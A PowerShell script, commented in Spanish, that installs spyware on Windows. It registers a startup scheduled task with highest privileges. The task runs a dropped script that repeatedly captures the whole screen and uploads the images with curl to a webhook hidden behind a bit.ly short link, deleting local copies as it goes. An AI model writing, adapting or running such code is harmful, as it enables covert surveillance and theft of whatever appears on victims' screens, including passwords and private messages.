# Función para crear la tarea programada al iniciar Windows
function CreateScheduledTask {
    param(
        [string]$taskName,
        [string]$scriptPath
    )

    try {
        $action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-File '$scriptPath'"
        $trigger = New-ScheduledTaskTrigger -AtStartup
        $settings = New-ScheduledTaskSettingsSet -DontStopIfGoingOnBatteries -DontStopOnIdleEnd

        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -User $env:USERNAME -RunLevel Highest -Force
    } catch {
        Write-Host "Error al crear la tarea programada: $_"
    }
}

# Ruta del script PowerShell y nombre de la tarea programada
$scriptPath = "$env:temp\sysw.ps1"
$taskName = "SyswStartupTask"

# Script para el script PowerShell
$scriptContent = @"
# URL del webhook principal
\$mainWebhookUrl = "https://bit.ly/web_chupakbras"
\$seconds = 30  # Intervalo de captura de pantalla en segundos
\$numberOfScreenshots = 20  # Cantidad de capturas de pantalla a enviar en un archivo zip

# Detectar URL acortada
if (\$mainWebhookUrl.Length -ne 121) {
    Write-Host "URL de Webhook acortada detectada..."
    \$mainWebhookUrl = (Invoke-RestMethod -Uri \$mainWebhookUrl).url
}

# Función para tomar y enviar capturas de pantalla
function TakeAndSendScreenshots {
    \$TempFolder = "\$env:temp\sysw"
    
    # Crea la carpeta temporal si no existe
    if (-not (Test-Path -Path \$TempFolder)) {
        New-Item -ItemType Directory -Path \$TempFolder | Out-Null
    }
    
    # Obtiene la resolución de la pantalla
    \$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
    \$Width = \$Screen.Width
    \$Height = \$Screen.Height
    \$Left = \$Screen.Left
    \$Top = \$Screen.Top
    
    # Toma las capturas de pantalla y las envía al webhook
    for (\$i = 1; \$i -le \$numberOfScreenshots; \$i++) {
        \$Filett = "\$TempFolder\SC\$i.png"
        \$bitmap = New-Object System.Drawing.Bitmap \$Width, \$Height
        \$graphic = [System.Drawing.Graphics]::FromImage(\$bitmap)
        \$graphic.CopyFromScreen(\$Left, \$Top, 0, 0, \$bitmap.Size)
        \$bitmap.Save(\$Filett, [System.Drawing.Imaging.ImageFormat]::png)
        Start-Sleep 1
        
        try {
            Write-Host "Enviando imagen \$i..."
            curl.exe -F "file1=@\$Filett" \$mainWebhookUrl
            Remove-Item -Path \$Filett -ErrorAction SilentlyContinue
        } catch {
            Write-Host "Error al enviar la imagen \$i al webhook: \$_"
        }
    }
}

# Ejecuta la función para tomar y enviar capturas de pantalla cada 30 segundos
while (\$true) {
    TakeAndSendScreenshots
    Start-Sleep -Seconds \$seconds
}
"@

# Guardar el script en un archivo
$scriptContent | Out-File -FilePath $scriptPath -Encoding ASCII

# Crear la tarea programada para ejecutar el script al iniciar Windows
CreateScheduledTask -taskName $taskName -scriptPath $scriptPath


